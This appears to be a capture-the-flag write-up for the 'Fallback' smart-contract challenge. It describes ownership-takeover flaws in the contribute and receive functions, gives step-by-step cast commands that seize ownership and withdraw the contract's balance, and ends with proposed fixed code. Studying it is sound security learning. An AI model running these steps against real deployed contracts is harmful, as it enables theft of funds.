# Fallback

1. Claim ownership of the contract
2. Reduce its balance to 0

## Vulnerability

### Ownership Takeover in `contribute` function

The `contribute` function changes the owner of the contract if the `msg.sender`'s contributions exceed the current owner's contributions. This could allow an attacker to take over the contract by simply contributing more than the current owner.

### Ownership Takeover in receive function

The `receive` function, which is called when the contract is sent Ether without data, changes the owner of the contract to `msg.sender` if `msg.sender` has made any contributions. This means that anyone who has made contributions can take over the contract by sending Ether to it.

### Potential for Denial of Service

The `withdraw` function transfers the entire balance of the contract to the owner. If the owner's address is a contract with a fallback function that reverts, or if the owner's address is unable to receive Ether for any reason, this could prevent the `withdraw` function from being executed successfully, effectively locking the funds in the contract.

### Lack of Input Validation

The `contribute` function requires that the value of Ether sent is less than 0.001 Ether, but there's no similar check in the `receive` function. This could lead to unexpected behavior if someone sends more than 0.001 Ether to the contract without data.

## Attack

```bash
1. await contract.address
2. # await contract.owner()
   cast call $CONTRACT_ADDRESS "owner()" --rpc-url $ALCHEMY_RPC_URL
3. cast send $CONTRACT_ADDRESS "contribute()" --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
4. cast call $CONTRACT_ADDRESS "getContribution()" --rpc-url $ALCHEMY_RPC_URL --from $ACCOUNT_ADDRESS
5. # {value: msg.value}("")
   cast send $CONTRACT_ADDRESS --value 0.000000000000000001ether --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
6. cast send $CONTRACT_ADDRESS "withdraw()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL
```

## Fix

```javascript
function withdraw() public onlyOwner {
    require(address(this).balance > 0, "Insufficient funds");
    (bool success, ) = payable(owner).call{value: address(this).balance}("");
    require(success, "Transfer failed");
}

receive() external payable {
    require(msg.value > 0 && msg.value < 0.001 ether && contributions[msg.sender] > 0);
    if (contributions[msg.sender] + msg.value > contributions[owner]) {
        owner = msg.sender;
    }
    contributions[msg.sender] += msg.value;
}
```